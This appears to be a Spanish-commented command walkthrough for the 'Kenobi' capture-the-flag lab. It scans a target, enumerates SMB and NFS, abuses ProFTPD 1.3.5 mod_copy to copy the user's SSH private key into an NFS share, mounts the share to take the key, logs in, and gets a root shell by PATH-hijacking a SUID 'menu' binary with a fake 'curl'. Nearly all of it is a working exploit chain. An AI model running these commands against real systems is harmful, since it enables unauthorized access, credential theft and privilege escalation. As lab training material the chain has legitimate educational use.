# 1. Escaneo inicial con nmap
nmap -sC -sV <IP_DE_KENOBI>

# 2. Enumeración de puertos SMB compartidos
smbclient -L //<IP_DE_KENOBI>
smbclient //<IP_DE_KENOBI>/anonymous

# 3. Enumeración del servicio RPC / NFS
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP_DE_KENOBI>

# 4. Conexión al servicio FTP (ProFTPD 1.3.5) y uso de mod_copy
nc <IP_DE_KENOBI> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

# 5. Montaje de NFS en la máquina local
mkdir /mnt/kenobiNFS
mount -t nfs <IP_DE_KENOBI>:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa ~/kenobi_id_rsa
chmod 600 ~/kenobi_id_rsa
ssh -i ~/kenobi_id_rsa kenobi@<IP_DE_KENOBI>

# 6. Escalada de privilegios SUID
find / -perm -u=s -type f 2>/dev/null
strings /usr/bin/menu
echo "/bin/sh" > curl
export PATH=$PWD:$PATH
/usr/bin/menu
